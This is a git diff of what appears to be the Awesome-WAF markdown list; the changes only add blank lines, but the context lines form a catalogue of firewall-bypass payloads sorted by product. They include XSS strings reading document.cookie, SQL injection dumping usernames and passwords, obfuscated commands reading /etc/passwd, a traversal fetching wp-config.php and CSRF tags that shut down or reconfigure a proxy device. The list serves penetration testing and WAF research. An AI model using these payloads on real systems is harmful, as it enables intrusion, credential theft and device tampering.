@@ -646,6 +646,7 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
 ```
+
 - [XSS Bypasses](https://twitter.com/h1_ragnar) by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
   
 ```
@@ -971,14 +972,17 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <img/src=q onerror='new Function`al\ert\`1\``'>
 ```
 - XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
+  
 ```
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 - SQLi Bypass by [@DRK1WI](https://www.exploit-db.com/?author=7740)
+  
 ```
 15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
 ```
 - SQLi by [@Giuseppe D'Amore](https://www.exploit-db.com/?author=6413)
+  
 ```
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
 ```
@@ -986,30 +990,38 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 
 ### Kona SiteDefender
 - [HTML Injection](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+  
 ```
 %2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
 ```
 - [XSS Bypass](https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c) by [@Jonathan Bouman](https://twitter.com/jonathanbouman)
+  
 ```
 <body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)"
 ```
+
 - [XSS Bypass](https://twitter.com/XssPayloads/status/1008573444840198144?s=20) by [@zseano](https://twitter.com/zseano)
+  
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 - XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
+  
 ```
 <abc/onmouseenter=confirm%60%60>
 ```
 - [XSS Bypass](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+  
 ```
 %2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
 ```
 - [XSS Bypass](https://twitter.com/fransrosen/status/1126963506723590148) by [@Frans Rosén](https://twitter.com/fransrosen)
+  
 ```
 <style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
 ```
 - [XSS Bypass](https://twitter.com/security_prince/status/1127804521315426304) by [@Ishaq Mohammed](https://twitter.com/security_prince)
+  
 ```
 <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
 ```
@@ -1018,19 +1030,23 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [GET Type CSRF Attack](https://www.exploit-db.com/exploits/7919) by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
 
 Turn off Proface Machine 
+
 ```
 <img src=https://host:2000/ajax.html?action=shutdown>
 ```
 Add a proxy
+
 ```
 <img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&vhost=vhost.com&vhost_port=80&rhost_proto=http&rhost=10.1.1.1&rhost_port=80&mode_pass=on&xmle=on&enable_file_upload=on&static_passthrough=on&action=add&do=save>
 ```
 
 - XSS Bypass by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
+  
 ```
 https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<script>alert(document.cookie)</script>
 ```
 - [XSS Bypass](https://www.securityfocus.com/bid/35053/info) by [@EnableSecurity](https://enablesecurity.com) (>= v2.4)
+  
 ```
 %3CEvil%20script%20goes%20here%3E=%0AByPass
 %3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E 
@@ -1038,6 +1054,7 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 
 ### QuickDefense
 - XSS Bypass by [@WAFNinja](https://waf.ninja/)
+  
 ```
 ?<input type="search" onsearch="aler\u0074(1)">
 <details ontoggle=alert(1)>
@@ -1045,19 +1062,23 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 
 ### Sucuri
 - [Smuggling RCE Payloads](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+  
 ```
 /???/??t+/???/??ss??
 ```
 - [Obfuscating RCE Payloads](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+  
 ```
 ;+cat+/e'tc/pass'wd
 c\\a\\t+/et\\c/pas\\swd
 ```
 - [XSS Bypass](https://twitter.com/return_0x/status/1148605627180208129) by [@Luka](https://twitter.com/return_0x)
+  
 ```
 "><input/onauxclick="[1].map(prompt)">
 ```
 - [XSS Bypass](https://twitter.com/brutelogic/status/1148610104738099201) by [@Brute Logic](https://twitter.com/brutelogic)
+  
 ```
 data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
 <input type=hidden name=a value="<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>">
@@ -1066,18 +1087,21 @@ data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
 
 ### URLScan
 - [Directory Traversal](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L557) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) (<= v3.1) (Only on ASP.NET)
+  
 ```
 http://host.com/test.asp?file=.%./bla.txt
 ```
 
 ### WebARX
 - Cross Site Scripting by [@0xInfection](https://twitter.com/0xinfection)
+  
 ```
 <a69/onauxclick=open&#40&#41>rightclickhere
 ```
 
 ### WebKnight
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
+  
 ```
 <isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
 <marquee/onstart=confirm(2)>
@@ -1086,34 +1110,41 @@ http://host.com/test.asp?file=.%./bla.txt
 <img src=x onwheel=prompt(1)>
 ```
 - SQLi by [@WAFNinja](https://waf.ninja)
+  
 ```
 0 union(select 1,username,password from(users))
 0 union(select 1,@@hostname,@@datadir)
 ```
 - XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan) (v4.1)
+  
 ```
 <details ontoggle=alert(1)>
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
 ```
 - [SQLi Bypass](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L562) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275)
+  
 ```
 10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
 ```
 
 ### Wordfence
 - XSS Bypass by [@brute Logic](https://twitter.com/brutelogic)
+  
 ```
 <a href=javas&#99;ript:alert(1)>
 ```
 - XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
+  
 ```
 <a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&colon;/**/alert()/**/>click
 ```
 - [HTML Injection](https://www.securityfocus.com/bid/69815/info) by [@Voxel](https://www.exploit-db.com/?author=8505)
+  
 ```
 http://host/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
 ```
 - [XSS Exploit](https://www.securityfocus.com/bid/56159/info) by [@MustLive](https://www.exploit-db.com/?author=1293) (>= v3.3.5)
+  
 ```
 <html>
 <head>
@@ -1129,6 +1160,7 @@ value="<script>alert(document.cookie)</script>">
 </html>
 ```
 - [Other XSS Bypasses](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+  
 ```
 <meter onmouseover="alert(1)"
 '">><div><meter onmouseover="alert(1)"</div>"
@@ -1137,6 +1169,7 @@ value="<script>alert(document.cookie)</script>">
 
 ### Apache Generic
 - Writing method type in lowercase by [@i_bo0om](http://twitter.com/i_bo0om)
+  
 ```
 get /login HTTP/1.1
 Host: favoritewaf.com
@@ -1145,6 +1178,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 
 ### IIS Generic
 - Tabs before method by [@i_bo0om](http://twitter.com/i_bo0om)
+  
 ```
     GET /login.php HTTP/1.1
 Host: favoritewaf.com
